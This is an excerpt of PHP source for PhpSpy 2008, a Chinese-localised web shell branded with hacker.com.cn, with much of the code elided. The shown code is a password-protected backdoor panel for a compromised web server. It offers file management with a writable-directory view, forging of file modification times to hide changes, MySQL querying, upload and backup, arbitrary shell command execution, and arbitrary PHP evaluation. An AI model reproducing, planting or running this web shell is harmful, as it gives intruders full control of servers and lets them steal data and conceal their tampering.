...
if ($action == "logout") {
	...
	p('<a style="font:12px Verdana" href="'.$self.'">登陆成功</a>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == $password) {
			...
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">成功</a>');
			exit;
		}
	}
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="http://www.hacker.com.cn" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 黑防专版</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
		<td><span style="float:right;">Safe Mode:<?php echo getcfg('safe_mode');?></span>
			<a href="javascript:goaction('logout');">退出登陆</a> | 
			<a href="javascript:goaction('file');">文件管理</a> | 
			<a href="javascript:goaction('sqladmin');">MySQL管理</a> | 
			<a href="javascript:goaction('sqlfile');">MySQL 上传 & 下载</a> | 
			<a href="javascript:goaction('shell');">执行命令</a> | 
			<a href="javascript:goaction('phpenv');">PHP 环境</a> | 
			<a href="javascript:goaction('eval');">执行php脚本</a>
...
if (!$action || $action == 'file') {
	...
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			...
			m('修改文件更新时间 '.(@touch($curfile,$time,$time) ? '成功' : '失败'));
		}
	}
	...
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' 不存在');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('文件时间修改 '.(@touch($curfile,$time,$time) ? '成功' : '失败'));
		}
	}
	...
	p('<h2>文件管理 - 当前盘符剩余空间 '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
...
function godir(dir,view_writable){
  ...
  <?php
	...
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">Web目录</a>');
	if ($view_writable) {
		p(' | <a href="javascript:godir(\''.$nowpath.'\');">查看全部</a>');
	} else {
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">查看可写</a>');
	}
...
Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
	...
	p('<tr class="head"><td> </td><td>文件名</td><td width="16%">最后更新</td><td width="10%">大小</td><td width="20%">属性</td><td width="22%">操作</td></tr>');
	...
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			...
			if($dirdb['filename']=='..') {
				p('<tr class='.bg().'>');
				p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">上级目录</a></td>');
				p('</tr>');
			}
		}
	}
	...
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">打包所选</a> - <a href="javascript:dofile(\'delfiles\');">删除所选</a></td><td colspan="4" align="right">'.$dir_i.' 目录 / '.$file_i.' 文件</td></tr>');
	p('</form></table>');
}// end dir
	...
	if($doing=="mysqlupload"){
		...
		if (file_exists($savepath)) {
			...
			if(!$filename) {
				...
				m($result ? '上传成功' : '麻痹 失败了: '.mysql_error());
			}
		}
	}
?>
	...
	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			...
			if ($fp) {
				...
				m('数据库成功备份到 <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('备份失败');
			}
...
<?php
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		...
		makeselect(array('title'=>'选择一个数据库:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			...
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">执行SQL查询 '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
...
elseif ($action == 'eval') {
	...
	formhead(array('title'=>'执行php脚本'));
	makehide('action','eval');
	maketext(array('title'=>'PHP 脚本','name'=>'phpcode', 'value'=>$phpcode));
...
elseif ($action == 'newtime') {
	...
	formfooter();
	formhead(array('title'=>'设置最后修改'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'当前文件 (路径)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead ?');
	p('year:');
...
elseif ($action == 'shell') {
	...
	if (IS_WIN && IS_COM) {
		...
		makeselect(array('title'=>'使用:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'命令','name'=>'command','value'=>$command));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();
...
elseif ($action == 'phpenv') {
	...
	makeinput(array('title'=>'请输入php配置参数(例:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	...
	phpspy2008 <a href="http://www.hacker.com.cn" target="_blank">aloner&shellcmd汉化</a> [原创作者4ngel].
</div>
</body>
</html>
...
?>
	...
	<p><a href="http://www.hacker.com.cn/">
  <img src="http://www.hacker.com.cn/images/logo.gif" </a></p>
	</form>
<?php
	exit;
}//end loginpage()
